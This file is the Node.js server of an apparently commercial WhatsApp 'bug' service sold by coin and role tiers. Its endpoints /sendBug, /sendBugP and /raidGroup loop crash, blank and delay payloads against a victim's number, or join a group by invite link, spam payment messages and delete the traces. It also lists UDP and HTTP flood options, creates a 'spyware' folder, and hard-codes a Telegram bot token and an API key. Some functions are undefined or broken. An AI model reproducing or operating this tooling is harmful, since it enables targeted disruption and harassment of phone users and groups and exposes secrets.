const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStderrWrite(chunk, encoding, callback);
};
const { crashnotif, delaynih, BlankHard, ATRXios, AndroXIos, crashUi, BulldozerMaklu } = require("./database/function.js");
const safeExit = process.exit;
const activeConnections = {};
const biz = {};
const mess = {};
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");

const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const qs = require("querystring");
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const http = require('http');
const os = require('os');
const WebSocket = require('ws');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true, perMessageDeflate: false });
const DATABASE_DIR = path.join(__dirname, 'database');
const { Client } = require('ssh2');
const DB_PATH = path.join(DATABASE_DIR, "database.json");
let activeKeys = {};
const KEY_FILE = path.join(DATABASE_DIR, 'keyList.json');
const clients = new Map();
const { ToolsController, sesionKey } = require("./tools/tgtools");
const WSPORT = 2090;
const VPSController = require("./tools/vps");
const bugs = [
  { bug_id: "fc", bug_name: "FORCLOSE" },
  { bug_id: "call", bug_name: "FORCLOSE CLICK" },
  { bug_id: "delay", bug_name: "DELAY SUPER HARD" },
    { bug_id: "delay1", bug_name: "DELAY INVIS" },
  { bug_id: "ios", bug_name: "IOS CRASH" },
  { bug_id: 'andro', bug_name: "DELAY X SEDOT KUOTA" },
  { bug_id: "blank", bug_name: "BLANK HARD" },
  { bug_id: "clear", bug_name: "CLEAR FC INFINITY" },
  { bug_id: "tes", bug_name: "DOZER X PENDING INVISIBLE" }
];
const tqto = [
       {
            name: "ALYANG 𝐗 SUIKA",
            status: "Dev",
            ppUrl: "https://gangalink.vercel.app/i/ty6qjaw1.jpg",
            contac: "t.me//Suikatk"
        },
        {
            name: "TIRTA 𝐗 MAXX",
            status: "Dev",
            ppUrl: "https://gangalink.vercel.app/i/ty6qjaw1.jpg",
            contac: "t.me//maxxdiraa"
        },
        {
            name: "RENDI 𝐗 BROCK",
            status: "Dev",
            ppUrl: "https://gangalink.vercel.app/i/ty6qjaw1.jpg",
            contac: "t.me/brockstoreidd"
        },
        {
            name: "YAANZ 𝐗 MANGYANZ",
            status: "Dev",
            ppUrl: "https://gangalink.vercel.app/i/ty6qjaw1.jpg",
            contac: "t.me//YaanzNotDev"
        }
];


const LOG_FILE = path.join(DATABASE_DIR, 'logUser.txt');

if (fs.existsSync(KEY_FILE)) {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
} else {
  sikmanuk = [];
  fs.writeFileSync(KEY_FILE, JSON.stringify(sikmanuk, null, 2));
}

if (!fs.existsSync('./database/spyware')) fs.mkdirSync('./database/spyware');

fs.watchFile(KEY_FILE, () => {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
});

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const ddosList = [
  {
    id: 1,
    name: "UDP FLOOD",
    power: "HIGH",
    status: "active"
  },
  {
    id: 2,
    name: "HTTP FLOOD",
    power: "MEDIUM",
    status: "maintenance"
  }
];

const TOKEN = "8754652468:AAGlihwyuP9kYZAllCqU5X5eprwZ139FxpQ";
const bot = new TelegramBot(TOKEN, { polling: true });
const OWNER_ID = 7102515835;
const ID_GROUP = [-1003996577678];
const ID_GROUP_UTAMA = [-1003996577678];
const API_ATLANTICH = "PTFriI6o1eWY06NRNn3vo7gWjEQo5YEqZLS4ARLdaBgCVtzmGuv5n7fyluyRElb7UtVvOREFk9FBTN6x6fh7JUsR1Hfx8ZPPJiNl";

function sendToGroups(text, options = {}) {
  for (const groupid of ID_GROUP) {
    bot.sendMessage(groupid, text, options).catch();
  }
}

function sendToGroupsUtama(text, options = {}) {
  for (const groupid of ID_GROUP_UTAMA) {
    bot.sendMessage(groupid, text, options).catch();
  }
}

function getAllActiveSessions() {
  const socks = [];

  for (const key of Object.keys(activeConnections)) {
    const value = activeConnections[key];

    // 1 user = 1 sender
    if (value && value.user) {
      socks.push(value);
    }
    // 1 user = banyak sender
    else if (value && typeof value === "object") {
      for (const subKey of Object.keys(value)) {
        const sock = value[subKey];
        if (sock) socks.push(sock);
      }
    }
  }

  return socks; // bisa kosong []
}

const dbPath = './database/db.json';

let db = JSON.parse(fs.readFileSync(dbPath));

function saveDb() {
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
}

const roleConfig = {
  member: {
    bulanan: 10000,
    permanent: 30000,
    keuntungan: "Akses fitur dasar"
  },
  reseller: {
    bulanan: 50000,
    permanent: 120000,
    keuntungan: "Bisa jual kembali & komisi"
  },
  owner: {
    bulanan: 150000,
    permanent: 300000,
    keuntungan: "Full akses & kontrol sistem"
  }
};

let transactions = {};
let users = [];

const PORT = 2090;
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const rateLimitMap = {};

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    console.log("❌ key tidak ditemukan");
    return null;
  }

  if (keyInfo.expires < Date.now()) {
    console.log("⏰ key expired");
    delete activeKeys[key];
    return null;
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    console.log("❌ user tidak ditemukan di database");
    return null;
  }

  return user;
}

function removeKeysByUsername(username) {
  for (const key in activeKeys) {
    if (activeKeys[key].username === username) {
      delete activeKeys[key];
    }
  }
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  return expired;
}
const ADMINS_FILE = path.join(__dirname, 'database', 'admins.json');
const DEVELOPER_IDS = [7102515835];
function loadAdmins() {
  try {
    if (!fs.existsSync(ADMINS_FILE)) {
      const defaultData = {
        owners: [],
        admins: [],
        resellers: []
      };
      fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
    const data = fs.readFileSync(ADMINS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading admins file:', error);
    return { owners: [], admins: [], resellers: [] };
  }
}

function saveAdmins(data) {
  try {
    const dir = path.dirname(ADMINS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving admins file:', error);
    return false;
  }
}

function isDeveloper(userId) {
  return DEVELOPER_IDS.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}

function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}

function hasAccess(userId) {
  return isDeveloper(userId) || isOwner(userId) || isAdmin(userId) || isReseller(userId);
}

function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Developer";
  if (isOwner(userId)) return "Owner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  return "No Access";
}

const CODE_DB = "./database/db_codes.json";

function loadCodes() {
  if (!fs.existsSync(CODE_DB)) fs.writeFileSync(CODE_DB, "[]");
  return JSON.parse(fs.readFileSync(CODE_DB));
}

function saveCodes(data) {
  fs.writeFileSync(CODE_DB, JSON.stringify(data, null, 2));
}

function isAdmin(userId) {
  return DEVELOPER_IDS.includes(userId);
}

const spamCooldown = {};
const cooldowns = {};

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/etjrki.jpg",
    title: "NOXTRA RVG V2.0",
    desc: "Buy Akses Hubungi : @primroseell"
  },
  {
    image: "https://files.catbox.moe/etjrki.jpg",
    title: "NOXTRA RVG",
    desc: "JOIN CHANNEL"
  }
];

app.get("/redeem", (req, res) => {
  try {
    const { key, code } = req.query;

    if (!key || !code) {
      return res.json({
        valid: true,
        success: false,
        message: "Parameter tidak lengkap"
      });
    }

    // 1. Load keylist (session)
    let keylist = JSON.parse(fs.readFileSync("./database/keyList.json"));

    // Cari sessionKey
    const keyData = keylist.find(k => String(k.sessionKey) === String(key));

    if (!keyData) {
      // Session tidak valid → Flutter akan logout
      return res.json({
        valid: false
      });
    }

    const username = keyData.username;

    // 2. Load database utama (coins ada di sini)
    let users = JSON.parse(fs.readFileSync("./database/database.json"));
    let codes = JSON.parse(fs.readFileSync("./database/db_codes.json"));

    // Cari user berdasarkan username
    const userIndex = users.findIndex(u => u.username === username);

    if (userIndex === -1) {
      // User hilang di database utama
      return res.json({
        valid: false
      });
    }

    const user = users[userIndex];

    // 3. Cek kode redeem
    const redeemCode = codes.find(c => c.code === code);

    if (!redeemCode) {
      return res.json({
        valid: true,
        success: false,
        message: "Kode tidak ditemukan"
      });
    }

    if (redeemCode.used === true) {
      return res.json({
        valid: true,
        success: false,
        message: "Kode sudah digunakan"
      });
    }

    const amount = Number(redeemCode.amount) || 0;

    // 4. Tambah coins ke database utama
    user.coins = (user.coins || 0) + amount;

    // 5. Tandai kode terpakai
    redeemCode.used = true;
    redeemCode.usedBy = username;
    redeemCode.usedAt = new Date().toISOString();

    // 6. Simpan kembali
    users[userIndex] = user;
    fs.writeFileSync("./database/database.json", JSON.stringify(users, null, 2));
    fs.writeFileSync("./database/db_codes.json", JSON.stringify(codes, null, 2));

    return res.json({
      valid: true,
      success: true,
      amount: amount,
      coins: user.coins
    });

  } catch (err) {
    console.error("❌ ERROR /redeem:", err);
    return res.json({
      valid: true,
      success: false,
      message: "Server error"
    });
  }
});
app.post("/validate", (req, res) => {
  const { username, password, androidId } = req.body;

  if (!username || !password || !androidId) {
    return res.json({ valid: false, message: "Invalid request" });
  }

  const db = loadDatabase();
  const user = db.find(
    u => u.username === username && u.password === password
  );

  if (!user) {
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // Optional: enforce 1 device 1 login
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession && existingSession.androidId !== androidId) {
    removeKeysByUsername(username); // rekomendasi
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || "member",
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listDDoS: ddosList ?? [], // biar Flutter aman
    news,
  });
});

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});


app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  
  if (!userKey) {
    return res.json({ valid: false, reason: "session" });
  }
  if (userKey.androidId !== androidId) {
    return res.json({ valid: false, reason: "device" });
  }
  if (!user) {
    return res.json({ valid: false });
  }
  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});
app.get("/getKey", (req, res) => {
  const { username } = req.query;
  const keyList = loadKeyList();
  const x = keyList.find(e => e.username === username);
  if (x) {
    return res.json({ status: true, key: x.sessionKey });
   } else {
    return res.json({ status: false })
   };
});
app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});
app.post("/giftCoin", (req, res) => {
  const { key, fromUsername, toUsername, amount } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ 
      valid: false, 
      message: "Invalid session key" 
    });
  }
  if (keyInfo.username.toLowerCase() !== fromUsername.toLowerCase()) {
    return res.json({ 
      valid: false, 
      message: "Username tidak sesuai dengan session" 
    });
  }
  const db = loadDatabase();
  const fromUser = db.find(u => u.username.toLowerCase() === fromUsername.toLowerCase());  
  if (!fromUser) {
    return res.json({ 
      valid: false, 
      message: "User pengirim tidak ditemukan" 
    });
  }
  const giftAmount = parseInt(amount);
  if (!giftAmount || giftAmount <= 0) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Jumlah coin tidak valid" 
    });
  }
  if (fromUser.coins === undefined) fromUser.coins = 0;  
  if (fromUser.coins < giftAmount) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Coin tidak cukup! Saldo: ${fromUser.coins}, dibutuhkan: ${giftAmount}` 
    });
  }
  const toUser = db.find(u => u.username.toLowerCase() === toUsername.toLowerCase());
  
  if (!toUser) {
    console.log("[❌ GIFT] Recipient not found");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `User ${toUsername} tidak ditemukan` 
    });
  }
  if (fromUsername.toLowerCase() === toUsername.toLowerCase()) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Tidak bisa mengirim gift ke diri sendiri" 
    });
  }
  if (toUser.coins === undefined) toUser.coins = 0;  
  const fromOldCoins = fromUser.coins;
  const toOldCoins = toUser.coins;  
  fromUser.coins -= giftAmount;
  toUser.coins += giftAmount;  
  saveDatabase(db);
  return res.json({
    valid: true,
    success: true,
    message: "Gift berhasil dikirim!",
    from_coins_before: fromOldCoins,
    from_coins_after: fromUser.coins,
    to_coins_before: toOldCoins,
    to_coins_after: toUser.coins
  });
});

async function swichBug(sock, targetJid, bug) {
  switch (bug) {
    case "blank":
      for (let i = 0; i < 40; i++) {
        await BlankHard(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "delay":
      for (let i = 0; i < 2000; i++) {
        await delaynih(sock, targetJid);
        await sleep(15000);
      }
      break;
    case "delay1":
      for (let i = 0; i < 40; i++) {
        await delaynih(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "call":
      for (let i = 0; i < 40; i++) {
        await crashnotif(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "andro":
      for (let i = 0; i < 15; i++) {
      await paySuck(sock, targetJid);
      await blankSticker(sock, targetJid);
      await paySuck(sock, targetJid);
      await blankSticker(sock, targetJid);
      }
      break;
    case "ios":
      for (let i = 0; i < 15; i++) {
        await BulldozerMaklu(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "tes":
      for (let i = 0; i < 150; i++) {
        await (sock, targetJid);
        await sleep(5000);
      }
      break;
    case "fc":
      for (let i = 0; i < 150; i++) {
       await spamOfmm (sock, targetJid);
       await spamOfmm (sock, targetJid);
       await spamOfmm (sock, targetJid);
      }
      break;
    case "clear":
      const b = await sock.sendMessage(targetJid, {
        text: "p"
      });
      console.log(b.message);
      break;
  }
}

app.get("/raidGroupP", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);

  if (!match) {
    return res.json({
      valid: false,
      message: "Invalid group link"
    });
  }

  const code = match[1];
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const now = Date.now();

  if (cooldowns[user.username] && now - cooldowns[user.username] < 500000) {
    const wait = Math.ceil((500000 - (now - cooldowns[user.username])) / 1000);
    return res.json({
      valid: false,
      message: `Cooldown aktif, tunggu ${wait} detik`
    });
  }

  if (user.coins === undefined) {
    user.coins = 100;
  }

  if (user.coins < 50) {
    return res.json({
      valid: true,
      sended: false,
      insufficient_coins: true,
      current_coins: user.coins,
      required_coins: 50,
      message: "Coin tidak cukup! Minimal 50 coin untuk mengirim bug."
    });
  }

  try {
    const sock = await checkActiveSessionInFolder("publik");
    if (!sock) {
      return res.json({ valid: true, sender: false });
    }

    user.coins -= 50;
    user.lastSend = now;
    saveDatabase(db);

    res.json({
      valid: true,
      sended: true,
      cooldown: false,
      coins_remaining: user.coins
    });

    cooldowns[user.username] = Date.now();

    const raidBot = async () => {
      const groupJid = await sock.groupAcceptInvite(code);
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.relayMessage(
          groupJid,
          { sendPaymentMessage: {} },
          {}
        );
        await new Promise(r => setTimeout(r, 600));
      }

      const lastMessagesInChat = {
        key: {
          remoteJid: groupJid,
          fromMe: true,
          id: ""
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };

      await sock.chatModify(
        {
          delete: true,
          lastMessages: [lastMessagesInChat]
        },
        groupJid
      );
    };

    raidBot();
  } catch (err) {
    return res.json({
      valid: false,
      message: "Join or send failed"
    });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);

  if (!match) {
    return res.json({
      valid: false,
      message: "Invalid group link"
    });
  }

  const code = match[1];
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const now = Date.now();

  if (cooldowns[user.username] && now - cooldowns[user.username] < 500000) {
    const wait = Math.ceil((500000 - (now - cooldowns[user.username])) / 1000);
    return res.json({
      valid: false,
      message: `Cooldown aktif, tunggu ${wait} detik`
    });
  }

  try {
    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return res.json({ valid: true, sender: false });
    }

    res.json({
      valid: true,
      sended: true,
      cooldown: false,
      coins_remaining: user.coins
    });

    cooldowns[user.username] = Date.now();

    const raidBot = async () => {
      const groupJid = await sock.groupAcceptInvite(code);
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.relayMessage(
          groupJid,
          { sendPaymentMessage: {} },
          {}
        );
        await new Promise(r => setTimeout(r, 600));
      }

      const lastMessagesInChat = {
        key: {
          remoteJid: groupJid,
          fromMe: true,
          id: ""
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };

      await sock.chatModify(
        {
          delete: true,
          lastMessages: [lastMessagesInChat]
        },
        groupJid
      );
    };

    raidBot();
  } catch (err) {
    return res.json({
      valid: false,
      message: "Join or send failed"
    });
  }
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: false });
  }

  const roleCooldowns = {
    member: 60,
    reseller: 60,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };

  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  const sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    return res.json({ valid: true, sender: false });
  }

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  setImmediate(async () => {
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
        await swichBug(sock, targetJid, bug);
        const db2 = loadDatabase();
    const u = db2.find(x => x.username === user.username);
    if (u) {
      u.lastSend = Date.now();
      saveDatabase(db2);
    }
    return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (err.message === 'Connection Closed') {
          try {
            sock.ws.close();
      } catch {}
      }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return;
    }
    await attemptSend(sock);
  });
});

app.get("/sendBugP", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  const keyInfo = activeKeys[key];

  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const socks = getAllActiveSessions();
  if (socks.length === 0) {
    return res.json({ valid: true, sender: false });
  }

  const COOLDOWN = 500000;
  const now = Date.now();

  if (cooldowns[user.username] && now - cooldowns[user.username] < COOLDOWN) {
    const wait = Math.ceil((COOLDOWN - (now - cooldowns[user.username])) / 1000);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait
    });
  }

  if (user.coins === undefined) user.coins = 100;
  if (user.coins < 50) {
    return res.json({
      valid: true,
      sended: false,
      insufficient_coins: true,
      current_coins: user.coins,
      required_coins: 50
    });
  }

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    coins_remaining: user.coins - 50
  });

  setImmediate(async () => {
    const targetJid = target + "@s.whatsapp.net";
    let successCount = 0;

    for (const sock of socks) {
      try {
        await swichBug(sock, targetJid, bug);
        successCount++;
        await new Promise(r => setTimeout(r, 1500));
      } catch (err) {
        if (err.message === "Connection Closed") {
          try { sock.ws.close(); } catch {}
        }
      }
    }

    if (successCount > 0) {
      const db2 = loadDatabase();
      const u = db2.find(x => x.username === user.username);
      if (u) {
        u.coins -= 50;
        u.lastSend = Date.now();
        saveDatabase(db2);
      }
      cooldowns[user.username] = Date.now();
    }
  });
});
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// Endpoint alternatif menggunakan POST (jika DELETE tidak support)
app.post("/deleteSender", (req, res) => {
  const { key, id } = req.body;
  
  // Validasi session key
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(401).json({ valid: false, message: "User not found" });
  }

  if (!id) {
    return res.status(400).json({ valid: false, message: "Sender ID is required" });
  }

  try {
    // Parse ID untuk mendapatkan informasi sender
    const sessionPath = path.join('session', user.username, id);
    
    // Cek apakah folder session exist
    if (fs.existsSync(sessionPath)) {
      // Hapus folder session beserta isinya
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log(`✅ Deleted session: ${sessionPath}`);
      
      // Hapus dari activeConnections jika ada
      if (activeConnections[id]) {
        try {
          if (activeConnections[id].sock) {
            activeConnections[id].sock.end(new Error("Session deleted by user"));
          }
        } catch (err) {
          console.log(`Error closing connection: ${err.message}`);
        }
        delete activeConnections[id];
      }
      
      return res.json({ 
        valid: true, 
        message: "Sender deleted successfully" 
      });
    } else {
      // Jika folder tidak ditemukan, cek di daftar active connections
      const activeSender = Object.keys(activeConnections).find(
        senderId => senderId === id || activeConnections[senderId]?.number === id
      );
      
      if (activeSender) {
        if (activeConnections[activeSender].sock) {
          activeConnections[activeSender].sock.end(new Error("Session deleted by user"));
        }
        delete activeConnections[activeSender];
        
        return res.json({ 
          valid: true, 
          message: "Sender disconnected successfully" 
        });
      }
      
      return res.status(404).json({ 
        valid: false, 
        message: "Sender not found" 
      });
    }
  } catch (err) {
    console.error(`❌ Error deleting sender: ${err.message}`);
    return res.status(500).json({ 
      valid: false, 
      message: `Failed to delete sender: ${err.message}` 
    });
  }
});

